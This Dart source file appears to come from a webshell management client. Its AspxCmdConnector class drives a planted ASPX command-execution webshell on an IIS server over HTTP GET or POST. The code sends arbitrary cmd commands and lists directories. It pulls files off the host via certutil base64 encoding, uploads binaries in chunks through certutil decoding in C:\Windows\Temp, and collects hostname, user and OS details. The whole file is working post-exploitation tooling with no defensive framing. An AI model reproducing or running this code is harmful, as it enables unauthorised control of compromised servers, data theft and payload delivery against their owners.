import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:http/http.dart' as http;

import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'asp_wscript_connector.dart';
import 'shell_connector.dart';

/// `aspx_cmd_post.aspx`：`System.Diagnostics.Process` 命令执行
///
/// .NET ASPX 版本，输出为纯文本（不需要 HTML 解码）。
/// 继承 [AspWscriptConnector] 中的 Windows 文件操作逻辑；
/// 仅覆盖 [sendRawCommand] 去掉 HTML 解码，并支持 GET / POST。
class AspxCmdConnector extends AspWscriptConnector {
  AspxCmdConnector(super.webshell);

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    // 纯 cmd 方案：先切目录，再按名称列表逐个提取属性/时间/大小。
    final raw = await sendRawCommand(
      'cd /d "$path" 2>nul && '
      'for /f "delims=" %I in (\'dir /b /a 2^>nul\') do '
      '@if /i not "%I"=="." if /i not "%I"==".." '
      '(if exist "%I\\*" '
      '(for %J in ("%I") do @echo D^|0^|%~tJ^|%~aJ^|%~nxJ) '
      'else (for %J in ("%I") do @echo F^|%~zJ^|%~tJ^|%~aJ^|%~nxJ))',
    );
    final entries = <FileEntry>[
      const FileEntry(
        name: '..',
        isDirectory: true,
        size: 0,
        permissions: '',
        modified: '',
      ),
    ];
    final seen = <String>{};
    for (final line in raw.split(RegExp(r'\r?\n'))) {
      final t = line.trim();
      if (t.isEmpty || t.startsWith('[')) continue;
      final parts = t.split('|');
      if (parts.length < 5) continue;
      final kind = parts[0].trim();
      final size = int.tryParse(parts[1].trim()) ?? 0;
      final modified = parts[2].trim();
      final perms = parts[3].trim();
      final name = parts.sublist(4).join('|').trim();
      if (name.isEmpty || name == '.' || name == '..') continue;
      final key = name.toLowerCase();
      if (!seen.add(key)) continue;
      entries.add(FileEntry(
        name: name,
        isDirectory: kind == 'D',
        size: kind == 'D' ? 0 : size,
        permissions: _formatWindowsAttrs(perms, kind == 'D'),
        modified: modified,
      ));
    }
    entries.sublist(1).sort((a, b) {
      if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
      return a.name.toLowerCase().compareTo(b.name.toLowerCase());
    });
    return entries;
  }

  @override
  Future<String> sendRawCommand(String cmd) async {
    try {
      final uri = Uri.parse(webshell.url);
      http.Response response;

      if (webshell.method == 'POST') {
        response = await http
            .post(
              uri,
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: {_param: cmd},
            )
            .timeout(const Duration(seconds: 30));
      } else {
        final params = Map<String, String>.from(uri.queryParameters);
        params[_param] = cmd;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 30));
      }

      if (response.statusCode != 200) return '[HTTP ${response.statusCode}]';
      // .NET Process 输出为纯文本，直接返回，无需 HTML 解码
      return decodeWithFallback(response.bodyBytes);
    } on TimeoutException {
      return '[Timeout]';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  String get _param =>
      webshell.password?.isNotEmpty == true ? webshell.password! : 'cmd';

  // ── 覆盖文件读写：.NET 可通过 PowerShell 做 Base64 传输 ──────────────────

  @override
  Future<String> readFile(String path) async {
    // 纯 cmd + certutil：避免 PowerShell 启动开销
    final raw = await sendRawCommand(
      'certutil -encode "$path" "%TEMP%\\__mx_enc.tmp" && '
      'type "%TEMP%\\__mx_enc.tmp" && '
      'del "%TEMP%\\__mx_enc.tmp"',
    );
    if (raw.isEmpty || raw.startsWith('[')) return '[文件不存在或无权读取]';
    try {
      return decodeWithFallback(base64.decode(_extractCertutilBase64(raw)));
    } catch (_) {
      return '[读取失败：编码错误]';
    }
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    final bytes = Uint8List.fromList(utf8.encode(content));
    return _writeBinaryChunked(path, bytes);
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    final raw = await sendRawCommand(
      'certutil -encode "$path" "%TEMP%\\__mx_enc.tmp" && '
      'type "%TEMP%\\__mx_enc.tmp" && '
      'del "%TEMP%\\__mx_enc.tmp"',
    );
    if (raw.isEmpty || raw.startsWith('[')) throw Exception('无法读取文件: $raw');
    return base64.decode(_extractCertutilBase64(raw));
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    return _writeBinaryChunked(path, bytes);
  }


  static const _kWinUploadChunkSize = 2048; // keep cmd length safe

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    return _writeBinaryChunked(path, bytes, onProgress: onProgress);
  }

  Future<bool> _writeBinaryChunked(
    String path,
    Uint8List bytes, {
    void Function(int sent, int total)? onProgress,
  }) async {
    final total = bytes.length;
    onProgress?.call(0, total);
    if (total == 0) {
      final r = await sendRawCommand('type nul > "$path" && echo 1');
      onProgress?.call(0, 0);
      return r.trim().contains('1');
    }

    int offset = 0;
    var first = true;
    while (offset < total) {
      final end = (offset + _kWinUploadChunkSize).clamp(0, total);
      final chunk = bytes.sublist(offset, end);
      final b64 = base64.encode(chunk);
      // IIS 进程通常对 C:\Windows\Temp 有写权限，%TEMP% 可能未设置。
      // 第一块：certutil 直接解码到目标路径，避免 copy 创建新文件时"拒绝访问"。
      // 后续块：解码到临时文件，再用 copy /b 追加到已存在的目标文件。
      const tmp = r'C:\Windows\Temp';
      final cmd = first
          ? 'del /f "$path" 2>nul & '
              'echo $b64 > "$tmp\\__mx_b64.tmp" && '
              'certutil -decode "$tmp\\__mx_b64.tmp" "$path" && '
              'del "$tmp\\__mx_b64.tmp" && echo 1'
          : 'del /f "$tmp\\__mx_bin.tmp" 2>nul & '
              'echo $b64 > "$tmp\\__mx_b64.tmp" && '
              'certutil -decode "$tmp\\__mx_b64.tmp" "$tmp\\__mx_bin.tmp" && '
              'copy /b "$path"+"$tmp\\__mx_bin.tmp" "$path" && '
              'del "$tmp\\__mx_b64.tmp" 2>nul & del "$tmp\\__mx_bin.tmp" 2>nul & echo 1';
      final r = await sendRawCommand(cmd);
      if (r.contains('ACCESS_DENIED') ||
          r.contains('拒绝访问') ||
          r.contains('Access is denied')) {
        throw Exception('目标路径写入被拒绝（IIS 进程无写权限）：$path');
      }
      if (!r.trim().contains('1')) return false;
      offset = end;
      first = false;
      onProgress?.call(offset, total);
    }
    return true;
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    const sep = '###MATRIX_SEP###';
    // 纯 cmd 快速模式：避免每次启动 powershell 导致系统信息加载缓慢。
    final cmd = [
      'echo ${sep}OS${sep}',
      'ver',
      'echo ${sep}USER${sep}',
      'echo %USERNAME%',
      'echo ${sep}PWD${sep}',
      'cd',
      'echo ${sep}HOST${sep}',
      'hostname',
    ].join(' & ');
    const keyMap = {
      'OS': 'OS',
      'USER': '运行用户',
      'PWD': '当前目录',
      'HOST': '主机名',
    };
    final info = AspxCmdConnector._parseSep(
      await sendRawCommand(cmd).timeout(const Duration(seconds: 12)),
      sep,
      keyMap,
    );
    // 避免显示 IIS 工作目录（如 inetsrv）造成误导，统一展示连接器当前目录。
    info['当前目录'] = currentDir;
    info['.NET CLR 版本'] = 'N/A (fast mode)';
    return info;
  }

  static Map<String, String> _parseSep(
      String raw, String sep, Map<String, String> keyMap) {
    final result = <String, String>{};
    String? currentKey;
    final buf = StringBuffer();
    for (final line in raw.split('\n')) {
      final t = line.trim();
      if (t.startsWith(sep) && t.endsWith(sep) && t.length > sep.length * 2) {
        if (currentKey != null && buf.isNotEmpty) {
          final label = keyMap[currentKey] ?? currentKey;
          result[label] = buf.toString().trim();
          buf.clear();
        }
        currentKey = t.substring(sep.length, t.length - sep.length);
      } else if (currentKey != null) {
        if (buf.isNotEmpty) buf.write('\n');
        buf.write(t);
      }
    }
    if (currentKey != null && buf.isNotEmpty) {
      final label = keyMap[currentKey] ?? currentKey;
      result[label] = buf.toString().trim();
    }
    return result;
  }

  /// 将 `%~a` 结果（如 `d-----` / `-a----`）压缩为更易读的 Windows 属性简写。
  static String _formatWindowsAttrs(String raw, bool isDir) {
    final s = raw.trim().toLowerCase();
    final flags = <String>[];
    if (isDir || s.contains('d')) flags.add('D');
    if (s.contains('r')) flags.add('R');
    if (s.contains('h')) flags.add('H');
    if (s.contains('s')) flags.add('S');
    if (s.contains('a')) flags.add('A');
    return flags.isEmpty ? '-' : flags.join(' ');
  }

  static String _extractCertutilBase64(String raw) {
    final lines = raw.split(RegExp(r'\r?\n')).map((l) => l.trim()).toList();
    var inside = false;
    final buf = StringBuffer();
    for (final line in lines) {
      if (line.startsWith('-----BEGIN')) {
        inside = true;
        continue;
      }
      if (line.startsWith('-----END')) break;
      if (!inside || line.isEmpty) continue;
      // 仅保留 Base64 字符，避免 Input Length / 其他提示文本污染。
      final cleaned = line.replaceAll(RegExp(r'[^A-Za-z0-9+/=]'), '');
      if (cleaned.isNotEmpty) buf.write(cleaned);
    }
    return buf.toString();
  }
}
